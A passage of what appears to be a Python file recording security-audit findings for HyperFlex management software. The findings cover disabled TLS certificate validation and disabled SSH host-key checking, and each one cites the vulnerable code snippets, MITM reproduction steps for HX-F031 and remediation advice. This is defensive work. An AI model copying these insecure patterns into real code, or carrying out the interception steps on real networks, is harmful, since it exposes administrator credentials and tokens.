        "  static { trustAllHttpsCertificates(); } // executes at class load\n"
        "  HttpsURLConnection.setDefaultSSLSocketFactory(trust_all_socket_factory)\n"
        "  HttpsURLConnection.setDefaultHostnameVerifier(DO_NOT_VERIFY)\n\n"
        "UpgradeSvcAccess (hxupgrade-1.0.0):\n"
        "  11: invokestatic #154 // Method trustAll:()V\n"
        "  new UpgradeSvcAccess$1 { checkServerTrusted(){ return; } }\n"
        "  HttpsURLConnection.setDefaultSSLSocketFactory(...)\n\n"
        "common-1.0.jar StMgrThriftClientFactory$$anon$1:\n"
        "  public void checkServerTrusted(X509Certificate[], String) { return; }\n\n"
        "Affected WARs: ROOT, slservice, hxupgrade, security, supportservice (x3),\n"
        "iscsi (x4), common-dep, hxSecuritySvcMgr, gateway (14 total)"
    ),
    "reproduction": (
        "ARP-spoof or DNS-redirect any management service hostname. "
        "Present a self-signed TLS certificate. "
        "Trigger any inter-service call (upgrade, SSO token exchange, iSCSI config). "
        "Observe that the connection completes without certificate error; "
        "capture credentials or session tokens from the intercepted traffic."
    ),
    "remediation": (
        "Remove all trustAll() implementations and no-op TrustManager inner classes. "
        "Initialize a TrustManagerFactory from the cluster's internal CA bundle "
        "(hyperflex_keystore.jceks at /etc/hyperflex/secure/) and use it for all "
        "TLS connections. Apply per-connection SSLContext rather than JVM-wide "
        "setDefaultSSLSocketFactory(). Audit all WAR deployments for the pattern "
        "'checkServerTrusted.*return' (bytecode 0: return) before each release."
    ),
    "references": ["CWE-295", "CWE-297"],
    "tags": ["tls-bypass", "jvm-global", "trustall", "cwe-295", "systemic", "high"],
}

HX_F032 = {
    "id": "HX-F032",
    "title": (
        "Systemic TLS Certificate Validation Disabled Across HyperFlex "
        "Management Scripts, Ansible Roles, and Deployment Toolchain (CWE-295)"
    ),
    "severity": "HIGH",
    "cvss": 7.4,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-295",
    "component": (
        "storfs-misc/hx-scripts (20+ scripts); "
        "storfs-deploy/ansible/ (storfs-mgmt-cli, deployNodes.py, commonFunctions.py, "
        "swagger_api_client.py, node_replace.py, configureNetworking_VCenter.py, "
        "upgrade hooks: 5999_apply_host_adv_settings_ESX.py, 6000_apply_stig_settings_ESX.py, "
        "5997_stig_setting_ESX.py, 0004_setup_vswitch_security_policy_ESX.py, "
        "0005_cleanup_eam_ESX.py, 0009_set_nfs_queue_depth_ESX.py + 30 others); "
        "storfs-factory (configureEthernetBondingForHX.py, springpath_env_parse.py + 2); "
        "storfs-stretched (switchToArbitrator.py, restWithRetry); "
        "storfs-misc/validation (springpath_vmware.py: ssl.CERT_NONE + SSLv23); "
        "curl -k in postinstall Ansible playbooks"
    ),
    "description": (
        "TLS certificate validation is disabled across the entire HyperFlex management "
        "toolchain through four independent mechanisms in 50+ script files. "
        "Mechanism 1: ssl._create_default_https_context = ssl._create_unverified_context "
        "applied at module import time in 20+ scripts. Replaces the interpreter-global "
        "default context, affecting all HTTPS connections in the process including "
        "transitively imported libraries (pyVmomi, boto3, paramiko). "
        "Mechanism 2: requests.get/post/put with verify=False in 30+ call sites covering "
        "vCenter credentials, Intersight arbitrator switchover, upgrade catalog downloads, "
        "swagger_api_client REST calls, stCli management operations, and factory provisioning. "
        "Mechanism 3: curl -k in five Ansible postinstall tasks transmitting admin credentials "
        "(-u admin:{{ ctlvmPassword }}) over unverified TLS. "
        "Mechanism 4: springpath_vmware.py explicitly constructs ssl.SSLContext with "
        "CERT_NONE and PROTOCOL_SSLv23 for ESX SmartConnect authentication. "
        "Combined effect: an attacker with MITM position on the management or deployment "
        "network intercepts vCenter administrator credentials, ESXi root passwords, "
        "Intersight tokens, and firmware image downloads across the full deployment lifecycle."
    ),
    "evidence": (
        "Module-level monkey-patch (repeated across 20+ scripts):\n"
        "  ssl._create_default_https_context = ssl._create_unverified_context\n\n"
        "springpath_vmware.py L456-460 (explicit CERT_NONE):\n"
        "  sslContext = ssl.SSLContext(ssl.PROTOCOL_SSLv23)\n"
        "  sslContext.verify_mode = ssl.CERT_NONE\n"
        "  hostSi = SmartConnect(host=ipAddress, ..., sslContext=sslContext)\n\n"
        "Ansible configure.yml L31 (curl -k with admin creds):\n"
        "  curl -k ... POST /securityservice/v1/removeauthkey\n"
        "       -u admin:{{ ctlvmPassword | b64decode }}\n\n"
        "swagger_api_client.py (verify=False on token auth):\n"
        "  response = requests.post(url, auth=(...), verify=False)\n\n"
        "switchToArbitrator.py L134 (Intersight arbitrator calls):\n"
        "  resp = restFn(url=restUrl, ..., verify=False)"
    ),
    "remediation": (
        "Remove all ssl._create_default_https_context monkey-patches. "
        "Replace with per-connection ssl.create_default_context() initialized with "
        "the HyperFlex CA bundle. "
        "Replace verify=False with verify='/path/to/ca-bundle.crt' for all requests calls. "
        "Remove -k from all curl invocations; use --cacert with the cluster CA certificate. "
        "Replace ssl.PROTOCOL_SSLv23/CERT_NONE with ssl.PROTOCOL_TLS_CLIENT and "
        "certificate validation against the internal CA. "
        "Establish a CI check that fails on any occurrence of these patterns in new code."
    ),
    "references": ["CWE-295", "CWE-297", "CWE-326"],
    "tags": ["tls-bypass", "python", "ssl-monkey-patch", "verify-false", "systemic", "high"],
}

HX_F033 = {
    "id": "HX-F033",
    "title": (
        "SSH Host Key Verification Disabled Across HyperFlex Cluster "
        "Management, Node Replacement, and STIG Operations (CWE-322)"
    ),
    "severity": "HIGH",
    "cvss": 7.4,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-322",
    "component": (
        "paramiko.AutoAddPolicy() in 30+ Python management scripts "
        "(storfs-factory, storfs-misc, storfs-deploy, storfs-misc/validation); "
        "replaceNode.sh: sshpass -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null; "
        "Ansible ansible.cfg: host_key_checking = False cluster-wide; "
        "6000_apply_stig_settings_ESX.py, 5997_stig_setting_ESX.py (STIG enforcement scripts)"
    ),
    "description": (
        "SSH host key verification is disabled at every layer of HyperFlex cluster "
        "management, enabling transparent MITM of all SSH-based administrative "
        "operations including those that claim to enforce security policy. "
        "Layer 1: paramiko.AutoAddPolicy() in 30+ scripts — factory provisioning, "
        "management scripts, validation, and STIG enforcement. AutoAddPolicy accepts "
        "and stores any host key without verification. Notably, 5997_stig_setting_ESX.py "
        "and 6000_apply_stig_settings_ESX.py — responsible for enforcing ESXi security "
        "baselines — use AutoAddPolicy to authenticate the hosts they are hardening. "
        "Layer 2: replaceNode.sh SSH/SCP helper functions (runCmdOnEsx, scpToEsx, "
        "scpToStCtlVM, runCmdOnStctlVM) invoke sshpass with -o StrictHostKeyChecking=no "
        "-o UserKnownHostsFile=/dev/null. ESXi password passed via -p $PASSWD, "
        "exposing it in /proc/<pid>/cmdline during execution. "
        "Layer 3: ansible.cfg sets host_key_checking = False cluster-wide, disabling "
        "SSH host key verification for all Ansible-driven operations. "
        "A rogue SSH responder on the management VLAN intercepts any ESXi root "
        "credential, cluster node password, or controller VM password."
    ),
    "evidence": (
        "paramiko (repeated across 30+ scripts):\n"
        "  client = paramiko.SSHClient()\n"
        "  client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n"
        "  client.connect(host, username='root', password=passwd)\n\n"
        "replaceNode.sh L159:\n"
        "  sshpass -p $PASSWD ssh -q \\\n"
        "    -o StrictHostKeyChecking=no \\\n"
        "    -o UserKnownHostsFile=/dev/null ${USERNAME}@$ESXHOST $*\n\n"
        "ansible.cfg:\n"
        "  [defaults]\n"
        "  host_key_checking = False\n\n"
        "6000_apply_stig_settings_ESX.py (STIG script with AutoAddPolicy):\n"
        "  ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())"
    ),
    "remediation": (
        "Replace AutoAddPolicy with RejectPolicy plus explicit host key fingerprint "
        "loading from a trusted store pre-populated during cluster initialization. "
        "Remove -o StrictHostKeyChecking=no from all ssh/scp invocations; "
        "pre-populate ~/.ssh/known_hosts on the stCtlVM with verified ESXi host keys. "
        "Remove host_key_checking = False from ansible.cfg; distribute known_hosts "
        "via Ansible itself at cluster setup time. "
        "Replace sshpass -p with SSH key authentication to eliminate password-in-cmdline exposure."
    ),
    "references": ["CWE-322", "CWE-295"],
    "tags": ["ssh-bypass", "autoaddpolicy", "stricthostkeychecking", "cwe-322", "systemic", "high"],
}

for _f in [HX_F031, HX_F032, HX_F033]:
    FINDINGS[_f["id"]] = _f

